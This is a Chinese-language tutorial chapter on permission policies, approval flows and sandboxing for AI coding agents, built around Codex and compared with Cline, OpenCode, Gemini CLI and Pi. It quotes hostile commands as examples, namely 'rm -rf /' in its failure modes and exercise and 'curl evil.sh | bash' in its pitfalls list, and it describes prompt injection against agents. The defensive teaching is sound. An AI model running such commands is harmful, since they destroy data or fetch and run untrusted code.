# 04 · 权限、审批与 Sandbox

> 核验日期：2026-08-30  
> 主项目：Codex / Rust  
> 对照项目：Cline、OpenCode、Gemini CLI、Pi

---

## 1. 一句话掌握

权限、审批与 Sandbox 范式回答的是：**Agent 的每一步行动在哪个层次被真正拦截、放行或质询**——它不是 prompt 里的 "please be careful"，而是在工具分发层、系统调用层和进程隔离层上强制实施的最小权限策略。

---

## 2. 为什么需要它

### 问题从何而来

Agent 的核心能力是"调用工具改变外部世界"：写文件、跑命令、发网络请求、读凭证。只要给它一把工具，它就能用；而模型是一个统计生成系统，**prompt 不是安全边界**——提示注入、越狱、幻觉指令、第三方内容中的恶意 payload，都能让 Agent 执行不在用户预期内的操作。

朴素实现的典型失败模式：

1. **全继承宿主权限**：Agent 以启动用户的 UID 运行，能读 `~/.ssh`、能 `rm -rf /`、能发内网请求。
2. **只靠 prompt 约束**：系统提示写"不要删除文件"，但一次 prompt injection 就能绕过。
3. **审批粒度太粗**：要么全部手动确认（交互成本爆炸），要么全部放行（等于没管）。
4. **审批发生在 UI 层**：后端工具执行路径绕过审批点，审批形同虚设。
5. **混淆 deputy 问题**（confused deputy problem）：Agent 被诱导使用它自己拥有的高权限去做攻击者的事，而攻击者本身没有这些权限。

### 相关理论与理念

- **Reference Monitor（引用监控器）**：所有对受保护资源的访问必须经过一个不可绕过的裁决点。它必须是防篡改的、总是被调用的、足够小到可验证。
- **Least Privilege（最小权限）**：每个组件只获得完成其任务所需的最小权限，不多给。
- **Default Deny（默认拒绝）**：未被明确允许的行为一律禁止，而不是未被禁止的一律允许。
- **Capability Security（能力安全）**：权限不是基于"你是谁"（身份），而是基于"你持有什么令牌"（能力）；能力只能被授予，不能被自取。
- **Prompt 不是安全边界**：模型可以被诱导、越狱、注入，任何只存在于 prompt 中的"禁令"都不构成可靠的安全保证。

### 在 Harness 体系中的位置

权限与 Sandbox 横跨 Harness 和 Runtime 两层：

- **Harness 层**：tool dispatch 时的 policy 检查、审批请求、CapabilitySet 管理。
- **Runtime 层**：进程级 sandbox、文件系统隔离、网络隔离、seccomp/seatbelt 等系统调用过滤。
- **Product 层**：UI 审批交互、workspace trust 对话框、权限设置面板。

真正的安全边界必须在 Runtime / OS 层强制；Harness 层的审批是人机协作接口，不是最终防线。

---

## 3. 最小概念模型

### 核心对象

```
ToolCall → PolicyEngine → PolicyDecision → Executor
                               ↑
                          ApprovalUI
                          (when Ask)
```

三个核心对象：

1. **PolicyEngine**：持有规则集，输入 ToolCall，输出 `Allow | Deny | Ask`。
2. **ApprovalRequest**：当决策为 Ask 时，挂起执行并向用户/审批者请求确认。
3. **Sandbox / CapabilitySet**：即使 Allow，执行也被限制在一组能力（可写路径、可访问网络、可调用 syscall）之内。

### 决策状态机

```
         ToolCall 到达
             │
             ▼
     ┌─────────────────┐
     │  PolicyEngine   │
     └───────┬─────────┘
             │
    ┌────────┼────────┐
    ▼        ▼        ▼
  Allow     Ask      Deny
    │        │        │
    │   ┌────┴────┐   │
    │   │ 审批交互 │   │
    │   └─┬─────┬─┘   │
    │     │     │     │
    │ 批准 │  拒绝 │   │
    └────►│     │◄────┘
          ▼     ▼
       执行    拒绝
          │
          ▼
   ┌──────────────┐
   │ Sandbox 强制 │
   │ (即使已批准) │
   └──────────────┘
```

关键点：**审批（Allow/Ask/Deny）和 Sandbox 是两道独立的闸**。审批解决"用户是否同意这个特定操作"，Sandbox 解决"即使批准了，操作的影响半径也被限制"。两者不能互相替代。

### 语言无关伪代码

```python
def execute_tool(tool_call, policy, sandbox_profile, approver):
    # 第一道闸：policy 裁决（reference monitor 入口）
    decision = policy.evaluate(tool_call)

    if decision == DENY:
        return ToolResult(error="Denied by policy")

    if decision == ASK:
        approval = approver.request(tool_call, decision.justification)
        if not approval.approved:
            return ToolResult(error="Rejected by user")
        # 审批通过可能附带额外权限
        sandbox_profile = sandbox_profile.merge(approval.extra_permissions)

    # 第二道闸：sandbox 强制（即使 Allow 也必须经过）
    try:
        result = sandboxed_exec(tool_call, sandbox_profile)
    except SandboxViolation as e:
        return ToolResult(error=f"Sandbox blocked: {e.violation_type}")

    return result
```

这段伪代码体现两个关键设计：policy 是不可绕过的裁决点；sandbox 是强制执行层，审批通过不等于脱离 sandbox。

---

## 4. 关键设计决策

### 决策 1：Policy 在工具分发层还是执行层裁决？

- **工具分发层裁决**（如 Cline 的 toolPolicies、OpenCode 的 permission 配置）：在 Harness 调用工具之前检查。优点是可以在模型层就隐藏不可用工具，减少幻觉；缺点是如果执行路径有旁路（直接调用底层 API），就绕过了安全。
- **执行层裁决**（如 Codex 的 execpolicy + execve wrapper）：在真正执行命令的系统调用入口拦截。优点是不可绕过（内核层面）；缺点是只能拦截它能看到的资源类型。

**方法论**：两层都要有。分发层负责 UX 和粗粒度控制，执行层（内核/沙箱）才是真正的 reference monitor。

### 决策 2：审批粒度——按工具、按命令前缀、还是按路径？

- **按工具**（粗）：`read_files` 全部自动批准，`run_commands` 全部问。实现简单，但 bash 工具里 `ls` 和 `rm -rf /` 同粒度。
- **按命令前缀**（中）：`git *` 放行，`rm *` 拒绝，其他询问。Codex execpolicy 和 OpenCode bash 权限都用这种。
- **按路径/资源**（细）：文件操作按路径模式匹配，网络按域名/端口匹配。OpenCode 的 edit/read 权限、Gemini CLI 的 sandbox mounts 属于此类。

**方法论**：三层组合使用最实用——工具级做默认开关，命令前缀级做白/黑名单，路径级做文件系统精确定界。

### 决策 3：Sandbox 是进程内、系统级还是容器级？

| 层级 | 代表实现 | 隔离强度 | 性能开销 | 适用场景 |
|------|----------|----------|----------|----------|
| 进程内权限模型 | Promise 权限代理、能力对象 | 低 | 极低 | 纯应用层隔离 |
| 系统调用过滤 | macOS Seatbelt、Linux Landlock/seccomp | 中 | 低 | 桌面端 CLI 工具 |
| 容器/VM | Docker、gVisor、MicroVM | 高 | 中-高 | 服务器端、不可信代码 |

**失败模式**：系统级 sandbox 的常见陷阱是配置错误——比如 profile 写错导致某些 syscall 被意外放行或拒绝，且很难测试。容器级的陷阱是挂载过度（把整个 home 目录挂进去等于没隔离）。

### 决策 4：Workspace Trust——信任是二元的还是分层的？

- **二元信任**（Gemini CLI 默认关闭的 folder trust）：trusted / untrusted 二选一，untrusted 进入安全模式。简单但粗糙。
- **分层 profile**（Codex 的 `:read-only` / `:workspace` / `:danger-full-access`）：不同 profile 授予不同能力级别。更灵活但配置成本高。
- **无内建信任模型**（Pi）：完全依赖外部 sandbox。

**方法论**：Workspace trust 解决的是"配置是否可信"（本地 settings、扩展、hooks），不是"Agent 行为是否可信"。两者经常被混为一谈——前者需要的是信任确认，后者需要的是持续的 policy + sandbox。

---

## 5. 代表项目代码佐证

主项目：**Codex（Rust）**。Codex 在 Rust 代码中完整实现了 execpolicy 裁决、shell-escalation 审批和多平台 sandbox，是权限范式最完整的开源样本。

### 5.1 Policy Decision：Allow / Prompt / Forbidden

> 源码路径：`codex-rs/execpolicy/src/decision.rs`  
> 以下为教学等价代码，保留核心结构和语义，省略了 serde 宏属性之外的辅助方法。

```rust
// 决策三态：这是整个权限系统的核心枚举
#[derive(Clone, Copy, Debug, Eq, PartialEq, Ord, PartialOrd)]
pub enum Decision {
    /// 命令可直接执行，无需进一步审批
    Allow,
    /// 请求用户显式批准；在 approval_policy="never" 时直接拒绝
    Prompt,
    /// 命令被禁止，不再进入后续流程
    Forbidden,
}

// 关键：Decision 实现了 Ord，严格度排序为 Allow < Prompt < Forbidden
// 多条规则匹配时取最严格的决策（max()）
fn aggregate_decisions(matches: &[Decision]) -> Decision {
    matches.iter().copied().max().unwrap_or(Decision::Allow)
}
```

**关键点：**

1. **三态而非二态**：`Prompt` 是独立的中间态，不是 "Allow with confirmation"——它在 `approval_policy=never` 场景下会退化为拒绝。
2. **严格度排序**：`Forbidden > Prompt > Allow`，多规则匹配时取最严格值。这是 default deny 思想的体现——任何一条规则说不行，就不行。
3. **错误路径明确**：`Forbidden` 直接终止，不会进入审批交互，也不会进入执行层。

### 5.2 规则匹配与前缀模式

> 源码路径：`codex-rs/execpolicy/src/rule.rs`、`codex-rs/execpolicy/src/policy.rs`  
> 以下为教学等价简化，省略了 host executable 回退和 network rule 部分。

```rust
// 单个 token 的匹配：精确字符串或若干备选之一
pub enum PatternToken {
    Single(String),
    Alts(Vec<String>),
}

// 前缀匹配模式：首 token 固定（用于索引），后续 token 可灵活
pub struct PrefixPattern {
    first: Arc<str>,
    rest: Arc<[PatternToken]>,
}

// 一条前缀规则 = 模式 + 决策 + 理由
pub struct PrefixRule {
    pattern: PrefixPattern,
    decision: Decision,
    justification: Option<String>,
}

// 规则匹配结果（包含审批所需的全部信息）
pub enum RuleMatch {
    PrefixRuleMatch {
        matched_prefix: Vec<String>,
        decision: Decision,
        resolved_program: Option<AbsolutePathBuf>,
        justification: Option<String>,
    },
    // ... 其他匹配类型
}
```

**在执行链中的位置**：ToolCall 到达后，`Policy::evaluate()` 用命令的第一个 token 从 `rules_by_program` 索引中取出候选规则，逐条测试前缀匹配，收集所有命中的 `RuleMatch`，再用 `max()` 聚合出最终决策。

### 5.3 Sandbox Profile 与 PermissionProfile

> 源码路径：`codex-rs/protocol/src/models.rs`、`codex-rs/sandboxing/src/manager.rs`  
> 以下为教学等价代码，保留核心枚举变体和字段。

```rust
// 沙箱执行模式：由谁负责隔离
pub enum SandboxEnforcement {
    Managed,   // Codex 自己构建 sandbox
    Disabled,  // 不使用 sandbox（危险）
    External,  // 外部调用方负责隔离
}

// 权限配置文件 = 文件系统权限 + 网络权限
pub enum PermissionProfile {
    Managed {
        file_system: ManagedFileSystemPermissions,
        network: NetworkSandboxPolicy,
    },
    Disabled,
    External { network: NetworkSandboxPolicy },
}

// 文件系统权限：受限（指定入口列表）或不受限
pub enum ManagedFileSystemPermissions {
    Restricted {
        entries: Vec<FileSystemSandboxEntry>,
        glob_scan_max_depth: Option<NonZeroUsize>,
    },
    Unrestricted,
}

// 内置 profile 的标识符（实际 profile 在运行时解析）
pub const BUILT_IN_READ_ONLY: &str = ":read-only";
pub const BUILT_IN_WORKSPACE: &str = ":workspace";
pub const BUILT_IN_FULL_ACCESS: &str = ":danger-full-access";
```

**关键点：**

1. **三层权限模型**：enforcement（谁负责）→ profile（授予什么）→ entries（具体路径/资源）。
2. **拒绝与错误路径**：sandbox 违规（写了不允许的路径、访问了禁止的网络）会产生 `SandboxViolationEvent`，被上层捕获并反馈给 Agent，而不是静默失败。
3. **`:danger-full-access` 明确标记**：用名字警告这是危险选项，而不是叫 "full" 或 "admin" 这种中性名称。

---

## 6. 热门项目横向对比

### 对比表

| 维度 | Codex (Rust) | Cline (TS/IDE) | OpenCode (TS) | Gemini CLI (Go) | Pi (TS) |
|------|-------------|----------------|---------------|-----------------|---------|
| **审批粒度** | 命令前缀匹配（Starlark 规则），精确 token 匹配 + basename 回退 | 按工具名 + 命令安全标记（`requires_approval` 由模型标注） | 按工具 + glob 模式（bash 命令前缀、文件路径） | 工具级 + sandbox expansion request | 无内建审批，全靠外部 |
| **Policy 三态** | Allow / Prompt / Forbidden，多规则取最严 | enabled / autoApprove（二元 + 开关） | allow / ask / deny，最后匹配规则获胜 | 隐式（sandbox profile + 扩展审批） | 无 |
| **Workspace Trust** | 隐式通过 permission profile（`:workspace` 限制写范围） | 依赖 IDE 的 workspace trust 信号 | 有，sandbox 预设限制 workspace 内写入 | 有，显式 folder trust，默认关闭，untrusted 进入安全模式 | 无 |
| **文件限制** | ManagedFileSystemPermissions::Restricted 条目，多平台 sandbox 实施 | 工具级（read/edit 分离），路径通过 IDE API 隐式限制 | edit/read 工具支持路径 glob，sandbox 层强制 workspace 边界 | sandbox mounts，默认只挂 workspace | 无内建限制，继承宿主 |
| **命令限制** | execpolicy 前缀规则 + execve wrapper 拦截 + sandbox 系统调用过滤 | safe commands vs requires_approval，模型判断 | bash 命令前缀 glob 匹配 | sandbox 内执行，可用命令由镜像决定 | 无内建限制 |
| **网络限制** | NetworkSandboxPolicy，sandbox 层强制 | 无内建网络限制（浏览器工具单独审批） | sandbox preset 控制 network 开关 | Seatbelt proxied 模式，容器级网络隔离 | 无内建限制 |
| **默认策略** | `--ask-for-approval untrusted` + `--sandbox read-only`（默认受限） | CLI 默认 auto-approve true，ACP 模式默认 false | 默认 ask（bash），plan 模式默认 deny edit | 默认启用 tool sandboxing，macOS 用 permissive-open Seatbelt | 默认继承宿主全部权限 |
| **Sandbox 实现** | macOS Seatbelt / Linux Landlock+bwrap / Windows Restricted Token | 依赖宿主环境，无内建进程级 sandbox | macOS Seatbelt 配置（实验性），workspace 边界 | 5 种：Seatbelt / Docker / Windows Low IL / gVisor / LXC | 无内建，推荐外部容器 |
| **审批 UI 交互** | CLI 交互式 prompt，支持 escalation（从 sandbox 升到宿主执行） | IDE 内审批面板，Plan/Act 模式切换 | TUI 内审批，支持 auto-approve 切换 | Sandbox Expansion Request 弹窗 | 无 |

### 共同收敛的设计

1. **三层模型普遍存在**：policy 规则 → 审批交互 → sandbox 强制执行。五个项目中四个都至少有两层，只有 Pi 完全外置。
2. **命令前缀匹配是主流**：Codex、OpenCode 都用前缀模式来区分安全/危险命令，这是因为 bash 工具的内部差异太大，工具级粒度不够。
3. **默认偏向保守**：Codex 默认 read-only sandbox + untrusted 审批；Gemini CLI 默认 tool sandboxing；OpenCode 默认 bash 询问。全部偏向 "先问再动"。
4. **sandbox 和审批是两道闸**：即使 Codex 的 `--full-auto` 模式也仍然在 workspace-write sandbox 内运行，不是裸奔。

### 仍有分歧的设计

1. **谁来判断"安全命令"**：Codex 和 OpenCode 用静态规则（确定性），Cline 让模型标注 `requires_approval`（概率性）。前者可靠后者灵活，但模型判断不能作为安全边界。
2. **多规则冲突解决**：Codex 取最严格（default deny 倾向），OpenCode 取最后匹配（配置灵活性倾向）。语义差异很大。
3. **workspace trust 的作用域**：Gemini CLI 的 trust 控制"是否加载本地配置"，Codex/OpenCode 的 trust 控制"文件写入范围"。同名但解决不同问题。

### 项目特有但不可盲目迁移的设计

- **Codex 的 execve wrapper + patched zsh**：拦截粒度到系统调用级，但需要改 shell，部署复杂度高，普通 Harness 项目不必做到这一层。
- **Gemini CLI 的五种 sandbox 后端**：覆盖面广但维护成本高，对桌面产品有价值，对纯服务端场景过度。
- **Cline 的模型判断安全命令**：UX 友好但不可作为安全保证，只能做 UX 分层，不能替代静态规则。

---

## 7. 方法论抽象

### 设计原则

1. **Reference Monitor 三原则**：不可绕过（每次访问都经过）、防篡改（代码小且可审计）、始终调用（没有旁路）。
2. **纵深防御**：policy 审批 + sandbox 强制 + 审计日志，三层互相备份。
3. **最小权限 + 默认拒绝**：未明确允许的就是禁止的；每个 profile 只给完成任务所需的最小能力。
4. **能力与身份分离**：Agent 拥有什么能力（capability）比 Agent "是谁" 更重要；能力通过工具集和 sandbox profile 授予，不是通过角色名。
5. **失败可观测**：拒绝、sandbox 违规、审批驳回都要有明确的事件和错误信息，Agent 能理解为什么失败，而不是只得到 "error"。

### 决策顺序

从 0 到 1 构建权限系统的推荐顺序：

1. **先加 sandbox**：即使什么审批都没有，sandbox 也能把破坏半径限制在 workspace 内。这是性价比最高的一步。
2. **再加工具级审批**：读操作放行、写操作询问。覆盖 80% 的日常场景。
3. **再加命令前缀规则**：对 bash 工具做白/黑名单，解决工具级粒度过粗的问题。
4. **再加路径级精确控制**：保护 `.git`、配置文件、凭证目录等敏感路径。
5. **最后加 workspace trust / 配置信任**：解决本地扩展和配置的安全性。

### 可复用数据模型

```
PolicyDecision     = Allow | Deny(details) | Ask(approval_request)
ApprovalRequest    = { tool, action, justification, risk_level, extra_permissions? }
CapabilitySet      = { fs_read_roots, fs_write_roots, network_rules, syscall_filter }
PermissionProfile  = { id, extends?, capabilities, approval_mode }
SandboxViolation   = { type, resource, profile, command, timestamp }
```

### 从最小实现到生产实现的路径

1. **最小可用**：工具级 allow/deny 开关 + 简单的容器 sandbox（Docker 挂载 workspace）。
2. **标准实现**：命令前缀规则 + 审批 UI + 多 profile（read-only / workspace / full）。
3. **生产级**：execve 级拦截 + 多平台原生 sandbox + 审计日志 + 违规告警 + 动态权限升降级。

---

## 8. 实践练习

### 练习：用 50 行代码实现一个三层权限引擎

**目标**：实现一个包含 policy 裁决、审批交互和 sandbox 模拟的最小权限系统，理解三闸模型。

**时间**：约 45 分钟。

**步骤**：

1. 定义 `Decision = "allow" | "deny" | "ask"` 和 `Rule = { pattern, decision, justification }`。
2. 实现 `evaluatePolicy(cmd: string[], rules: Rule[]): Decision`——按空格切分命令，做前缀匹配，多规则命中取最严格。
3. 实现一个 `askUser(decision, cmd)` 函数，模拟审批交互（可以直接用 prompt 或者返回硬编码的批准/拒绝）。
4. 实现 `sandboxedExecute(cmd, profile)` 函数，模拟 sandbox：如果命令包含 "rm" 且 profile 是 `read-only`，抛 `SandboxViolation`。
5. 串起来：policy → (ask if needed) → sandbox → result。
6. 测试用例：`ls`（allow + sandbox 通过）、`rm -rf /`（deny 直接拒绝）、`npm install`（ask 后批准但 sandbox 报违规）。

**检验标准**：

- `rm -rf /` 在 policy 层就被拒绝，不会进入审批也不会进入 sandbox。
- `npm install` 在 policy 层是 ask，用户批准后进入 sandbox，在 read-only profile 下因为写操作被 sandbox 拦截。
- 错误路径全部有明确的错误类型和消息，不是静默失败。

---

## 9. 掌握检查

### 自测问题

1. 为什么说 "prompt 不是安全边界"？请从 reference monitor 三原则的角度解释。
2. 审批（Allow/Deny/Ask）和 Sandbox 有什么区别？为什么两者不能互相替代？
3. 多规则匹配时，Codex 取最严格值，OpenCode 取最后匹配。这两种策略各自适合什么场景？各自的失败模式是什么？
4. 什么是 confused deputy problem？在 Agent 系统中，什么配置错误会导致这个问题？
5. Workspace trust 和 file permission 是同一回事吗？它们分别解决什么问题？

### 生产落地检查清单

上线 Agent 权限系统前，逐项确认：

- [ ] **Reference monitor 不可绕过**：所有工具执行只有一个入口，且入口处必做 policy 检查。
- [ ] **默认拒绝**：未匹配任何规则的操作默认是 deny 或 ask，不是 allow。
- [ ] **Sandbox 独立于审批**：即使审批通过，操作仍然在 sandbox 内执行；审批通过 ≠ 脱离隔离。
- [ ] **最小权限 profile**：默认 profile 是完成任务所需的最小能力集，而不是全权限。
- [ ] **敏感路径保护**：`.git`、凭证文件、SSH 密钥、配置目录在写权限中被排除。
- [ ] **审批可审计**：所有审批请求和结果有日志，包含谁批的、批了什么、为什么。
- [ ] **违规可观测**：sandbox 违规事件有明确类型、资源和上下文，能被 Agent 理解并调整策略。
- [ ] **配置不可被 Agent 改写**：权限规则、sandbox profile 本身不在 Agent 的可写范围内。

### 常见误区

1. **"我们有系统提示告诉 Agent 不要做危险操作"**——这不是安全措施，这是愿望。模型可以被注入、越狱、幻觉。
2. **"我们有审批，所以不需要 sandbox"**——审批是人机协作，sandbox 是强制执行。审批可能误点、可能被社工、可能 auto-approve 全开。
3. **"我们有 sandbox，所以不需要审批"**——sandbox 限制破坏半径，但不能防止 Agent 在允许范围内做不该做的事（比如在 workspace 内批量删代码）。审批解决"该不该做"，sandbox 解决"做多糟"。
4. **"工具级粒度够了"**——bash 工具里 `ls` 和 `curl evil.sh | bash` 是同一个工具。工具级审批在 bash 面前几乎等于没管。
5. **把 workspace trust 当权限系统**——trust 只管"加不加载本地配置"，管不了 Agent 运行时的行为。Agent 在 trusted workspace 里仍然可以搞破坏。
6. **"用模型判断命令是否安全"**——模型判断可以做 UX 优化（减少打扰），但不能做安全保证。安全边界必须是确定性的。

---

## 10. 边界与延伸阅读

### 不适用边界

- 本范式讨论的是**工具执行层面**的权限，不涉及模型本身的安全（对齐、越狱、数据泄露）。
- 不涉及多租户隔离和云原生安全（Kubernetes RBAC、IAM、service mesh）。
- 不涉及内容安全（输出过滤、敏感信息检测）。

### 官方来源

- Codex execpolicy 模块：[openai/codex/codex-rs/execpolicy](https://github.com/openai/codex/tree/main/codex-rs/execpolicy)
- Codex Decision 枚举源码：[openai/codex/codex-rs/execpolicy/src/decision.rs](https://github.com/openai/codex/blob/main/codex-rs/execpolicy/src/decision.rs)
- Codex PermissionProfile 定义：[openai/codex/codex-rs/protocol/src/models.rs](https://github.com/openai/codex/blob/main/codex-rs/protocol/src/models.rs)
- Codex sandboxing 模块：[openai/codex/codex-rs/sandboxing](https://github.com/openai/codex/tree/main/codex-rs/sandboxing)
- Codex shell-escalation 模块：[openai/codex/codex-rs/shell-escalation](https://github.com/openai/codex/tree/main/codex-rs/shell-escalation)
- Cline 权限处理文档：[docs.cline.bot/sdk/guides/permission-handling](https://docs.cline.bot/sdk/guides/permission-handling)
- Cline Auto Approve 文档：[docs.cline.bot/features/auto-approve](https://docs.cline.bot/features/auto-approve)
- OpenCode 权限文档：[anomalyco/opencode permissions.mdx](https://github.com/anomalyco/opencode/blob/dev/packages/web/src/content/docs/permissions.mdx)
- OpenCode SECURITY.md：[anomalyco/opencode SECURITY.md](https://github.com/anomalyco/opencode/blob/main/SECURITY.md)
- Gemini CLI Sandbox 文档：[geminicli.com/docs/cli/sandbox](https://www.geminicli.com/docs/cli/sandbox)
- Gemini CLI Trusted Folders 文档：[geminicli.com/docs/cli/trusted-folders](https://www.geminicli.com/docs/cli/trusted-folders)
- Pi Agent 仓库：[earendil-works/pi](https://github.com/earendil-works/pi)

### 延伸概念

- **Capability-based Security**：[Wikipedia - Capability-based security](https://en.wikipedia.org/wiki/Capability-based_security)
- **Confused Deputy Problem**：经典安全问题，Agent 作为 deputy 被诱导使用自身权限执行恶意操作。
- **Reference Monitor**：[Wikipedia - Reference monitor](https://en.wikipedia.org/wiki/Reference_monitor)
- **Landlock**：Linux 内核的安全模块，用于进程级文件系统隔离。
- **macOS Seatbelt / Sandbox-exec**：macOS 内置的沙箱机制，基于沙箱 profile 定义。

### 下一步阅读

- **第 3 篇 · Workspace 与 Runtime 隔离**：理解 Sandbox 所依附的执行环境边界。
- **第 6 篇 · Durable State 与恢复**：理解审批中断如何持久化并在恢复后继续。
